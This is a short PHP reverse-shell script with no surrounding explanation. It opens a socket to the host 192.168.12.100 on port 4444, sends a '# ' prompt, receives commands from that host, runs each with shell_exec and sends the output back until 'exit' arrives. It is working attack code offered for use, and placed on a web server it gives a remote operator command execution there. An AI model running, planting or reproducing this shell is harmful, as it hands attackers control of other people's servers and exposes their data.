<?php 
$socket = socket_create(AF_INET, SOCK_STREAM, 0) or die("Could not create socket\n");
// Socket will be bind to any IP address on port 51234
socket_bind($socket, '0.0.0.0', 51234);
// Change the listening port in socket_connect()
$connection = socket_connect($socket, '192.168.12.100', 4444);
$output = array();;
$message = "# ";
while ($socket && $connection){
	$message = "# ";
	socket_send($socket, utf8_encode($message), strlen($message), MSG_EOF);
	
	
	$read = false;
	while($read == false){
	$read = socket_recv($socket, $data, 1024, MSG_DONTWAIT);
	}
	$data = trim(utf8_decode($data));
	if($data != 'exit' ){
		if(!(empty($read))){
		$output = shell_exec($data);
		socket_send($socket, $output, strlen($output) , MSG_EOF);
		$output = array();
		}
		
	}
	else{
		$connection = false;
		socket_close($socket);
	}
	
	
	
	
	
}

